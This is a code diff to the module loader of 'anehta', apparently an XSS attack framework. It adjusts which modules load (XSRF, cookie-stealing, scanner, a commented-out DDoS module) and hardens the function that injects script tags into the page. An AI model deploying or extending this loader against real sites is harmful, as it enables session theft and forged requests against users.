@@ -15,18 +15,21 @@ var anehtaLibs = [
   {name: "AnehtaLib", url: "/library/anehta.js"},
   //{name: "DojoLib", url: "......"},
   {name: "JqueryLib", url: "/library/jquery.js"}
+  /*
+  {name: "UICore", url: "/server/js/ui.core.js"},
+	{name: "UICore", url: "/server/js/ui.draggable.js"},
+	{name: "UICore", url: "/server/js/ui.dialog.js"},
+	{name: "UICore", url: "/server/js/ui.resizable.js"}
+	*/
 ];
 
 var anehtaModules = [
   // Modules
-  //{name: "BoomerangMod", url: "/module/boomerang.js"},
   {name: "ClxMod", url: "/module/clx.js"},
   {name: "XsrfMod", url: "/module/xsrf.js"},
   //{name: "DdosMod", url: "/module/ddos.js"},
   {name: "XCookieMod", url: "/module/xcookie.js"},
-  //{name: "RealtimeCmdMod", url: "/module/realtimecmd.js"},
   {name: "ScannerMod", url: "/module/scanner.js"},
-  {name: "ClientproxyMod", url: "/module/clientproxy.js"},
   {name: "CustomizeMod", url: "/module/customize.js"},
   {name: "HelpMod", url: "/module/help.js"},
   {name: "TestMod", url: "/module/test.js"}
@@ -36,7 +39,12 @@ var anehtaModules = [
 function injectScript(ptr_sc){
     s=document.createElement("script");
     s.src=ptr_sc;
-    document.getElementsByTagName("body")[0].appendChild(s);
+    try {
+      document.getElementsByTagName("body")[0].appendChild(s);
+    } catch (e) {
+    	document.documentElement.appendChild(document.createElement("body"));
+			document.getElementsByTagName("body")[0].appendChild(s);
+    }
 }
 
 function addScript(ptr_sc){
